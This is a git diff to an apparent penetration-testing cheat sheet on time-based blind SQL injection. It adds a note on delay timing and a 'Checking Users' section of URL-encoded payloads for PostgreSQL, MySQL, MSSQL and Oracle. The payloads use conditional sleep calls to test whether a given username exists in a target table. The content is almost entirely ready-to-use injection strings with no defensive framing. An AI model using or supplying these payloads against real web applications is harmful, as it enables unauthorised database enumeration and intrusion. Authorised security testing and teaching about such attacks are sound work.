@@ -38,7 +38,7 @@ The paramter can be a trackingID, sessionID etc...
 /*
 since blind sqli don't return visible results so
 the payloads are designed to ask true/false questions using time delay and 
-based on that we can perform database enumeration.
+based on that we can perform database enumeration. Time delay in seconds so 10 = 10 seconds.
 Check both the payloads of the corresponding database version 1=1 and 1=2 conditions and determine whether the database takes time to respond or not. 
 
 %3B means ; (semicolon) 
@@ -47,4 +47,18 @@ You can also write (;) and then select the entire payload and click URL encoding
 */
 ```
 
+### 3. Checking Users
 
+```sql
+-- PostgreSQL
+'%3BSELECT+CASE+WHEN+(<username column>='<username>')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+<table_name>--
+
+-- MySQL / MariaDB
+'%3BSELECT+IF((<username column>='<username>'),SLEEP(10),SLEEP(0))#
+
+-- Microsoft SQL Server (MSSQL)
+'%3BIF(<username column>='<username>')+WAITFOR+DELAY+'0:0:10'--
+
+-- Oracle
+'%3BSELECT+CASE+WHEN+(<username column>='<username>')+THEN+DBMS_PIPE.RECEIVE_MESSAGE('ADS',10)+ELSE+NULL+END+FROM+<table_name>--
+```
